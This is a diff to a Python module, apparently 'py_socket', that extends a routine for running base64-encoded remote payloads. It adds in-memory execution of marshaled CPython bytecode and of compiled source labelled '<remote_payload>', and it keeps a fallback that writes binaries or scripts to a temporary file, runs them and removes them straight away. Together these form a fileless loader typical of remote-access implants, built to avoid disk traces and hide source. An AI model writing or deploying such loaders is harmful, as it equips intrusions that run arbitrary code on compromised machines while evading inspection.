@@ -10,6 +10,7 @@ compatibility with any Python 3.6+ environment.
 
 import base64
 import hashlib
+import marshal
 import os
 import subprocess
 import sys
@@ -70,13 +71,15 @@ def execute_base64_encoded_value(data_b64: str, *args: str) -> None:
 
     Chooses the execution strategy based on the decoded content:
 
-    - **Python in-memory execution** (``exec``): When the payload begins with
-      a Python shebang (``#!/usr/bin/env python``), a ``#!python`` marker, or
-      when the first non-blank line starts with a Python keyword (``import``,
-      ``def``, ``class``). This avoids writing anything to disk.
+    - **Marshaled Python bytecode execution**: If the payload deserializes to a
+      valid CPython code object via ``marshal.loads``, it is executed directly
+      in-memory via ``exec`` without writing to disk.
+    - **Python source in-memory execution**: If the payload appears to be Python
+      source code, it is compiled in-memory via ``compile`` with diagnostic metadata
+      and executed via ``exec`` without writing to disk.
     - **Subprocess execution**: For shell scripts or arbitrary binaries. The
-      decoded content is written to a deterministic temporary file, the file
-      is made executable, executed via ``subprocess.run``, and then removed.
+      decoded content is written to a deterministic temporary file, made executable,
+      executed via ``subprocess.run``, and removed immediately in a ``finally`` block.
 
     Args:
         data_b64: Base64-encoded payload to execute.
@@ -92,14 +95,29 @@ def execute_base64_encoded_value(data_b64: str, *args: str) -> None:
 
     raw_bytes = base64.b64decode(data_b64)
 
+    # Strategy 1: Marshaled code object (in-memory)
+    try:
+        code_obj = marshal.loads(raw_bytes)
+        if isinstance(code_obj, type((lambda: None).__code__)):
+            try:
+                exec(code_obj, globals())  # noqa: S102
+            except (Exception, SystemExit) as exc:
+                print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)
+            return
+    except Exception:
+        pass
+
+    # Strategy 2: Python source code (in-memory compilation)
     if _is_python_payload(raw_bytes):
-        code = raw_bytes.decode(errors="replace")
+        code_str = raw_bytes.decode(errors="replace")
         try:
-            exec(code, globals())  # noqa: S102
+            compiled = compile(code_str, "<remote_payload>", "exec")
+            exec(compiled, globals())  # noqa: S102
         except (Exception, SystemExit) as exc:
             print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)
         return
 
+    # Strategy 3: OS binary / shell script (temporary file fallback)
     filepath = store_base64_encoded_value(data_b64)
 
     try:
@@ -108,6 +126,41 @@ def execute_base64_encoded_value(data_b64: str, *args: str) -> None:
     finally:
         with suppress(OSError):
             os.remove(filepath)
+
+
+def execute_marshaled_code(data_b64: str) -> None:
+    """Decode a Base64-encoded marshaled code object and execute it in-memory.
+
+    Args:
+        data_b64: Base64-encoded marshaled bytecode.
+    """
+
+    if not data_b64:
+        raise ValueError("data_b64 must not be empty.")
+
+    raw_bytes = base64.b64decode(data_b64)
+    code_obj = marshal.loads(raw_bytes)
+
+    try:
+        exec(code_obj, globals())  # noqa: S102
+    except (Exception, SystemExit) as exc:
+        print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)
+
+
+def execute_python_source(code: str, filename: str = "<remote_payload>") -> None:
+    """Compile Python source in-memory and execute it directly in globals.
+
+    Args:
+        code: Python source code string.
+        filename: Traceback filename tag.
+    """
+
+    try:
+        compiled = compile(code, filename, "exec")
+        exec(compiled, globals())  # noqa: S102
+    except (Exception, SystemExit) as exc:
+        print(f"[py_socket error] {type(exc).__name__}: {exc}", file=sys.stderr)
+
 
 
 def _is_python_payload(raw_bytes: bytes) -> bool:
